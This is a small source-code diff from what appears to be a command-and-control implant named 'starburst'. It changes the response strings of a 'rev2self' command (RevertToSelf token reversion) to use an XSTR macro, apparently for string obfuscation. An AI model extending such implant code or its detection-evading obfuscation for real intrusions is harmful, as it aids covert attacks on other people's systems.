@@ -17,7 +17,7 @@ auto declfn starburst::cmd_rev2self(
 ) -> void {
     if ( !inst.advapi32.RevertToSelf() ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "RevertToSelf failed" ) ) );
+            XSTR( "RevertToSelf failed" ) );
         return;
     }
 
@@ -27,7 +27,7 @@ auto declfn starburst::cmd_rev2self(
     }
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS,
-        symbol<char*>( const_cast<char*>( "reverted to self" ) ) );
+        XSTR( "reverted to self" ) );
 }
 
 #endif
